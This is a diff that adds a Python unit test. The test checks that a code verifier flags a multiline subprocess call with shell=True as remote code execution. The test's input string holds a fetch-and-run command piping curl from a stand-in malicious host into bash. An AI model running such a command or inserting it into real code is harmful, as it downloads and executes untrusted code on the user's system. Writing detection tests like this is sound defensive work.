@@ -20,3 +20,19 @@ def test_subprocess_shell_true_curl_pipe_detected():
 
     assert result["critical_count"] >= 1
     assert any(issue["type"] == "remote_code_execution" for issue in result["issues"])
+
+
+def test_subprocess_multiline_shell_true_curl_pipe_detected():
+    verifier = CodeVerifier()
+    code = (
+        "import subprocess\n"
+        "subprocess.run(\n"
+        '    "curl http://malicious.com | bash",\n'
+        "    shell=True,\n"
+        ")\n"
+    )
+
+    result = verifier.verify_code(code, language="python")
+
+    assert result["critical_count"] >= 1
+    assert any(issue["type"] == "remote_code_execution" for issue in result["issues"])
